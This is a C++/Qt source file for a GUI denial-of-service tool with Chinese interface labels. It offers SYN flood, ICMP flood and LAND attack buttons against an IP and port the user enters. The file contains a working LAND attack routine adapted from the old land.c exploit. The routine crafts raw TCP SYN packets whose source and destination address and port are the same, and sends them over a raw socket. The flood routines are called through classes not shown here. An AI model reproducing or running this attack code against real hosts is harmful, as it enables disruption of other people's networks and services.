#include "attack.h"

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <QThread>
#include <QTimer>

My_Obj_attack::My_Obj_attack()
{
    proc = new QProcess();
    timer = new QTimer();
    connect(timer, SIGNAL(timeout()), this, SLOT(start_timer()));
    timer->start(500);
}
void My_Obj_attack::start_timer()
{
//    if(timer->isActive())
//        timer->stop();
    out = "";
    emit send_appendOutput("out");
    QString program = "bash";;
    QStringList arguments;
    arguments<<g_sWorkingPath + "/Scripts/netinfo/2/netspeed.sh";
    proc->start(program, arguments);
    if(!proc->waitForStarted())
    {
        return;
    }
    while(true == proc->waitForFinished())
    {
            out += proc->readAll();
        emit send_appendOutput(out);
    }
//    timer->start(1500);
}

#pragma pack(1)

struct pseudohdr
{
        struct in_addr saddr;
        struct in_addr daddr;
        u_char zero;
        u_char protocol;
        u_short length;
        struct tcphdr tcpheader;
};
u_short checksum(u_short * data,u_short length)
{
        register long value;
        u_short i;

        for(i=0;i<(length>>1);i++)
                value+=data[i];

        if((length&1)==1)
                value+=(data[i]<<8);

        value=(value&65535)+(value>>16);

        return(~value);
}

int attack::doland()
{
    char ip[128] = "127.0.0.1";
    QByteArray ba = m_inputIp->text().toLatin1();
    sprintf(ip, "%s", ba.data());
    uint16_t port = m_inputPort->text().toInt();

    struct sockaddr_in sin;
    struct hostent * hoste;
    int sockfd;
    char buffer[40];
    struct iphdr * ipheader=(struct iphdr *) buffer;
    struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
    struct pseudohdr pseudoheader;

    fprintf(stderr,"land.c by m3lt, FLC\n");

    bzero(&sin,sizeof(struct sockaddr_in));
    sin.sin_family=AF_INET;

    if((hoste=gethostbyname(ip))!=NULL)
            bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
    else if((sin.sin_addr.s_addr=inet_addr(ip))==-1)
    {
            fprintf(stderr,"unknown host %s\n",ip);
            return(-1);
    }

    if((sin.sin_port=htons(port))==0)
    {
            fprintf(stderr,"unknown port %s\n",m_inputPort->text().toInt());
            return(-1);
    }

    if((sockfd=socket(AF_INET,SOCK_RAW,255))==-1)
    {
            fprintf(stderr,"couldn't allocate raw socket\n");
            return(-1);
    }

    bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
    ipheader->version=4;
    ipheader->ihl=sizeof(struct iphdr)/4;
    ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
    ipheader->id=htons(0xF1C);
    ipheader->ttl=255;
    ipheader->protocol=IPPROTO_TCP;//IP_TCP;
    ipheader->saddr=sin.sin_addr.s_addr;
    ipheader->daddr=sin.sin_addr.s_addr;

    tcpheader->th_sport=sin.sin_port;
    tcpheader->th_dport=sin.sin_port;
    tcpheader->th_seq=htonl(0xF1C);
    tcpheader->th_flags=TH_SYN;
    tcpheader->th_off=sizeof(struct tcphdr)/4;
    tcpheader->th_win=htons(2048);

    bzero(&pseudoheader,12+sizeof(struct tcphdr));
    pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
    pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
    pseudoheader.protocol=6;
    pseudoheader.length=htons(sizeof(struct tcphdr));
    bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
    tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));

    if(sendto(sockfd,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
    {
            fprintf(stderr,"couldn't send packet\n");
            return(-1);
    }
    QString qmsg = m_inputIp->text()+ ":" + m_inputPort->text() +"landed\n";
    appendOutput(qmsg);

//    fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);

    ::close(sockfd);

}

attack::attack(QWidget *parent) : QWidget(parent)
{
    // 初始化页面
    initWidget();

    // 将功能页面存放到堆栈里
    m_stackWidget = new QStackedWidget();
    m_stackWidget->addWidget(m_widget);

    // 设置本页的主界面排版
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addWidget(m_stackWidget);
    main_layout->setStretchFactor(m_stackWidget, 4);
    main_layout->setContentsMargins(0,0,0,0);
    setLayout(main_layout);

    connect(m_buttonSYN, SIGNAL(clicked()), this, SLOT(syn_flood()));
    connect(m_buttonICMP, SIGNAL(clicked()), this, SLOT(icmp_flood()));
    connect(m_buttonLAND, SIGNAL(clicked()), this, SLOT(land()));

    psyn = new class syn_flood();
    picmp = new class icmp_flood();

    My_Obj_attack_object  = new My_Obj_attack();
    my_thread = new QThread();
    My_Obj_attack_object->moveToThread(my_thread);

    connect(My_Obj_attack_object, SIGNAL(send_appendOutput(QString)), this, SLOT(appendOutput(QString)));

    this->setAutoFillBackground(true);

}


void attack::initWidget()
{
    m_widget = new QWidget();
    m_textResult = new QTextBrowser();
    m_textResult->setFixedSize(680,320);

    m_inputIp = new QLineEdit();
    m_inputIp->setText("172.16.113.56");
    m_inputIp->setFixedSize(100, 24);

    m_inputPort = new QLineEdit();
    m_inputPort->setText("6666");
    m_inputPort->setFixedSize(100, 24);


    // 设置
    QFont fontButton;
    fontButton.setPointSize(13);
    m_buttonSYN= new QPushButton();
    m_buttonSYN->setText(tr("SYN Flood攻击"));
    m_buttonSYN->setFont(fontButton);

    m_buttonICMP= new QPushButton();
    m_buttonICMP->setText(tr("ICMP Flood攻击"));
    m_buttonICMP->setFont(fontButton);

    m_buttonLAND= new QPushButton();
    m_buttonLAND->setText(tr("LAND攻击"));
    m_buttonLAND->setFont(fontButton);

    // 水平布局-1
    QHBoxLayout *widget_1_H_layout = new QHBoxLayout();
    QLabel * labeluser = new QLabel();
    labeluser->setText("请输入IP：");
    widget_1_H_layout->addWidget(labeluser, 0, Qt::AlignLeft);
    widget_1_H_layout->addWidget(m_inputIp,0,Qt::AlignLeft);//, 70, Qt::AlignRight);

    QLabel * labelpwd = new QLabel();
    labelpwd->setText("请输入端口号：");
    widget_1_H_layout->addWidget(labelpwd);//, 0, Qt::AlignLeft);
    widget_1_H_layout->addWidget(m_inputPort,0,Qt::AlignLeft);//, 70, Qt::AlignRight);

    widget_1_H_layout->setContentsMargins(20, 5, 20, 5);

    // 水平布局-2
    QHBoxLayout *widget_2_H_layout = new QHBoxLayout();
    widget_2_H_layout->addWidget(m_buttonSYN,0,Qt::AlignLeft);//, 70, Qt::AlignRight);
    widget_2_H_layout->addWidget(m_buttonICMP,0,Qt::AlignLeft);//, 70, Qt::AlignRight);
    widget_2_H_layout->addWidget(m_buttonLAND,0,Qt::AlignLeft);//, 70, Qt::AlignRight);

    widget_2_H_layout->setContentsMargins(20, 5, 20, 5);
    // 垂直布局
    QVBoxLayout *widget_1_V_layout = new QVBoxLayout();
    widget_1_V_layout->addLayout(widget_1_H_layout);
    widget_1_V_layout->addLayout(widget_2_H_layout);

    widget_1_V_layout->addWidget(m_textResult);//, 0, Qt::AlignTop);
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addLayout(widget_1_V_layout);
//    main_layout->setContentsMargins(0, 0, 0, 0);

    m_widget->setLayout(main_layout);
}

void attack::syn_flood()
{
    if(m_buttonSYN->text()=="停止攻击")
    {
        psyn->set_sig_int();

        m_buttonICMP->setEnabled(true);
        m_buttonLAND->setEnabled(true);
        m_buttonSYN->setText("SYN Flood攻击");
        appendOutput("攻击已停止");

    }
    else {
        m_buttonSYN->setText("停止攻击");
        m_buttonICMP->setEnabled(false);
        m_buttonLAND->setEnabled(false);

        appendOutput("开始攻击");

        QByteArray ba = m_inputIp->text().toLatin1();
        psyn->do_main(ba.data(),m_inputPort->text().toInt());


    }


}
void attack::icmp_flood()
{
    if(m_buttonICMP->text()=="停止攻击")
    {
        picmp->set_sig_int();
        appendOutput("攻击已停止");

        m_buttonSYN->setEnabled(true);
        m_buttonLAND->setEnabled(true);
        m_buttonICMP->setText("ICMP Flood攻击");
    }
    else {
        appendOutput("开始攻击");

        m_buttonICMP->setText("停止攻击");
        m_buttonSYN->setEnabled(false);
        m_buttonLAND->setEnabled(false);

        QByteArray ba = m_inputIp->text().toLatin1();
        picmp->do_main(ba.data());
    }

}

void attack::land()
{

    if(m_buttonLAND->text()=="停止攻击")
    {
        m_buttonSYN->setEnabled(true);
        m_buttonICMP->setEnabled(true);
        m_buttonLAND->setText("ICMP Flood攻击");

  //      psyn->sig_int(0);
        appendOutput("攻击已停止");

    }
    else {
        appendOutput("开始攻击");

        m_buttonLAND->setText("停止攻击");
        m_buttonSYN->setEnabled(false);
        m_buttonICMP->setEnabled(false);


        QByteArray ba = m_inputIp->text().toLatin1();
//        psyn->do_main(ba.data(),m_inputPort->text().toInt());
        doland();

    }

}

void attack::appendOutput(QString output) {
    QString strOldRecord = m_textResult->placeholderText().left(1024);
    m_textResult->setPlaceholderText(strOldRecord + "\n" + output);
}

